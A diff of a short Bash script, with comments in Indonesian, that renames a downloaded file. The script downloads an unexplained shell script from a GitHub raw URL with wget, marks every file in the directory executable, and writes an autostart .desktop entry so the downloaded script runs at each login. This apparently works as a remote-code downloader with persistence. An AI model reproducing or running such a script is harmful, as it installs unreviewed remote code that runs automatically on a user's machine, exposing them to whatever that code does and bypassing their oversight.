@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Script
- rm -rvf xnxx.sh; wget -O xnxx.sh https://raw.githubusercontent.com/Maulana021k/xnxx/refs/heads/main/xox.sh; chmod +x *
+ rm -rvf x0x.sh; wget -O x0x.sh https://raw.githubusercontent.com/Maulana021k/xnxx/refs/heads/main/xox.sh; chmod +x *
 
 # Nama file .desktop
 DESKTOP_FILE="$HOME/.config/autostart/ix.desktop"
@@ -13,7 +13,7 @@ mkdir -p "$HOME/.config/autostart"
 cat <<EOF > "$DESKTOP_FILE"
 [Desktop Entry]
 Type=Application
-Exec=/home/user/xnxx.sh
+Exec=/home/user/x0x.sh
 Hidden=false
 NoDisplay=false
 X-GNOME-Autostart-enabled=true
